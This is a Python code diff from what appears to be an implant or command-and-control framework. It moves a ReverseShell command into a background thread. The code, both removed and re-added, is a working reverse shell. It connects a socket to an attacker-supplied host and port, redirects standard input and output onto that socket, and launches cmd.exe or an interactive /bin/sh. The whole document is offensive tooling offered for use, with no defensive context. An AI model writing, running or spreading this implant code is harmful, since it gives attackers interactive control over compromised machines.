@@ -3,6 +3,8 @@ import subprocess
 import os
 from command import Command
 import platform
+from implant.thread_master import run_in_thread
+
 
 LISTENING_HOST = "lh"
 LISTENING_PORT = "lp"
@@ -18,19 +20,22 @@ class ReverseShell(Command):
         success = True
         results = ""
         
-        lh = args[LISTENING_HOST]
-        lp = args[LISTENING_PORT]
-        
-        if "Windows" in platform.system():
-            shell = ["cmd.exe"]
-        else:
-            shell = ["/bin/sh","-i"]
-        
-        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        s.connect((lh,int(lp)))
-        os.dup2(s.fileno(),0)
-        os.dup2(s.fileno(),1)
-        os.dup2(s.fileno(),2)
-        p=subprocess.call(shell);
+        results = run_in_thread(send_reverse_shell,args=args)
         
         return success, results
+        
+def send_reverse_shell(args):
+    lh = args[LISTENING_HOST]
+    lp = args[LISTENING_PORT]
+        
+    if "Windows" in platform.system():
+        shell = ["cmd.exe"]
+    else:
+        shell = ["/bin/sh","-i"]
+        
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect((lh,int(lp)))
+    os.dup2(s.fileno(),0)
+    os.dup2(s.fileno(),1)
+    os.dup2(s.fileno(),2)
+    p=subprocess.call(shell);
